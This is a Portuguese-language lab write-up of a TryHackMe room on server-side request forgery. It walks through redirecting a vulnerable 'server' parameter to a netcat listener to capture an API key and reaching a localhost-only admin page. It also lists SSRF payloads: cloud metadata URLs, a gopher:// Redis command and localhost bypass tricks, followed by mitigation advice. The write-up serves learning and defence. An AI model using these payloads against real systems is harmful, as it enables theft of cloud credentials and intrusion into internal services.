# Write-up: TryHackMe — SSRF (Server-Side Request Forgery)

**Plataforma:** TryHackMe  
**Sala:** Server-Side Request Forgery (SSRF) — Web Fundamentals / Web Hacking  

---

## 1. Introdução e objetivos da sala

A sala **SSRF** ensina sobre Server-Side Request Forgery, uma classe de vulnerabilidades onde uma aplicação web aceita uma URL/host do usuário e faz requests a esse destino em nome do servidor. Se não houver validação adequada, um atacante pode forçar o servidor a requisitar recursos internos (localhost, serviços internos) ou externos controlados pelo atacante, expondo dados sensíveis ou permitindo pivot interno.

Objetivos:
- Entender o que é SSRF e seus impactos (exfiltração de dados, descoberta de rede interna, abuso de serviços confiáveis).
- Explorar vetores básicos (abrir URLs, parâmetros `url`/`server`) e avançados (interagir com serviços não-HTTP, acessar metadata endpoints).
- Praticar técnicas de exploração e ver como extrair chaves/api-keys e acessar áreas restritas.

---

## 2. Ferramentas utilizadas

* Navegador (DevTools / Network) — inspecionar requests e parâmetros.  
* Burp Suite / proxy HTTP — interceptar e modificar requisições; receber callbacks do SSRF.  
* `nc` / `netcat` — listener para capturar requisições HTTP vindas do servidor.  
* `curl` — testar endpoints e payloads rapidamente.  
* AttackBox / VM do TryHackMe — ambiente do laboratório.

---

## 3. Conceito: o que é SSRF?

**SSRF** ocorre quando a aplicação aceita uma URL/host controlada pelo usuário e, sem validações adequadas, realiza requisições a esse endereço. Isso pode permitir:

- **Acesso a serviços internos** que não são expostos publicamente (metadata services, banco de dados de administração, endpoints internos).  
- **Vazamento de chaves/segredos** que a aplicação usa internamente (ex.: header de autorização numa requisição interna).  
- **Pivoting**: interagir com serviços TCP/UDP internos ou até executar comandos dependendo do serviço alcance.

Exemplo simples:
```
GET /fetch?url=http://example.com
```
Se a aplicação fizer `GET url` diretamente, um atacante pode colocar `url=http://169.254.169.254/latest/meta-data/` (AWS metadata) e recuperar credenciais.

---

## 4. Metodologia e resolução (walkthrough)

> Fluxo prático baseado no laboratório descrito na sala (http://MACHINE_IP:8087).

### Cenário fornecido
A aplicação possuía funcionalidade para "Download Resume" que aceitava um parâmetro `server` indicando de onde baixar o arquivo. A página restringia o acesso ao admin a `localhost`, mas a funcionalidade `server` era controlada por usuário e vulnerável a SSRF.

**Passos realizados:**

1. **Exploração básica — redirecionar para attacker-controlled host**
   - Configurei um `nc -lvp 80` no meu AttackBox para ouvir requisições:
     ```bash
     nc -lvp 80
     ```
   - No site vulnerável, alterei o parâmetro do botão (por exemplo `?server=attacker.thm`) para apontar para meu AttackBox.
   - A aplicação fez uma requisição HTTP para `http://<my-ip>` e meu listener recebeu a requisição contendo headers possivelmente com informações sensíveis.
   - Dessa requisição interceptada, eu vi um header ou payload com uma API key:
     ```
     THM{Hello_Im_just_an_API_key}
     ```
   - **Flag encontrado (API key):** `THM{Hello_Im_just_an_API_key}`

2. **Acesso a área admin via SSRF**
   - Analisei a página e descobri que o admin só podia ser acessado a partir de `localhost` (server-side check).  
   - Usei SSRF para fazer a aplicação requisitar `http://localhost:8087/admin` (ou o caminho que apontasse para o admin interno).  
   - Se o serviço validava o host do request (ex.: `Host: localhost`) ou usava origem do servidor, a requisição server-side alcançou a rota administrativa, permitindo obter conteúdo restrito ou um flag extra (alguns labs oferecem esse passo como "going the extra mile").

3. **Exploração avançada e técnicas**
   - Testei variações de hostnames e esquemas:
     - `http://127.0.0.1:8087/...`
     - `http://[::1]:8087/...`
     - `http://169.254.169.254/...` (metadata em cloud providers)
   - Em alguns ambientes, foi necessário lidar com:
     - **DNS rebinding / host header tricks** para contornar blacklist baseada em nomes.
     - **URLs com portas** para alcançar serviços em portas não-padrão.
     - **Protocol wrappers** (file://, gopher://) para interagir com outros serviços; p.ex. `gopher://` pode ser usado para falar diretamente com redis/SMTP se o servidor aceitar.

---

## 5. Payloads e técnicas úteis

### Básicos
- Callback para atacante:
  ```
  http://YOUR_IP/
  ```
  Configurar `nc -lvp 80` para capturar.

- Acessar `localhost`:
  ```
  http://127.0.0.1:8080/admin
  http://localhost:8087/secret
  ```

### Metadata (cloud-specific — use apenas em lab/permissa)
- AWS IMDSv1:
  ```
  http://169.254.169.254/latest/meta-data/
  ```
- GCP metadata:
  ```
  http://metadata.google.internal/computeMetadata/v1/
  ```

### Gopher (interagir com serviços TCP)
- Exemplo para falar com Redis (hipotético):
  ```
  gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0ASET%0D%0A$3%0D%0Akey%0D%0A$5%0D%0Avalue%0D%0A
  ```
  (URL-encoded payload seguindo protocolo do serviço)

### Bypasses comuns a testar
- Usar IPs alternativos (`127.1`, `127.0.0.1`, IPv6).
- Inserir credenciais ou porta explícita.
- DNS rebinding ou usar um domínio que resolve para localhost no servidor (dependendo do ambiente).
- Testar schemes diferentes (`http`, `https`, `gopher`, `file`) conforme o parser do servidor.

---

## 6. Mitigações e recomendações

Prevenir SSRF exige uma combinação de validação, whitelist e medidas de defesa:

1. **Whitelist de domínios/hosts permitidos**: permitir apenas uma lista estrita de hosts confiáveis para requests server-side (evitar blacklists).  
2. **Resolver e validar IPs**: depois da resolução DNS, verifique que o IP não aponta para ranges internos (127.0.0.0/8, 10.0.0.0/8, 169.254.169.254, 192.168.0.0/16, etc.).  
3. **Sanitização de input e remoção de protocolos perigosos**: bloquear schemes como `file://` e `gopher://` se não necessários.  
4. **Timeouts e rate-limits**: limites na quantidade de requests e tempo de resposta para reduzir impacto.  
5. **Não exponha informações sensíveis em headers**: evitar incluir secrets em headers de requests que podem ser entregues a destinos controlados pelo usuário.  
6. **Network segmentation / egress controls**: usar firewall para impedir que servidores façam requests para endpoints internos sensíveis; limitar egress a serviços necessários.  
7. **Autenticação forte entre serviços**: serviços internos não confiem somente em origem do request — use mutual TLS, tokens com escopo restrito, etc.

---

## 7. Lições aprendidas e conclusão

SSRF é uma vulnerabilidade poderosa porque transforma o servidor em um proxy para recursos que o atacante não alcançaria diretamente. Em ambientes em nuvem, os riscos são ainda maiores por causa de metadata services que podem expor credenciais. A sala demonstra passo a passo como detectar, explorar e mitigar SSRF.  

Para desenvolvedores: implemente whitelists e validações robustas e não exponha mecanismos que permitam o servidor a requisitar URLs arbitrárias. Para defensores: monitorar e restringir egress e logs de requests para detectar possíveis SSRF.

---
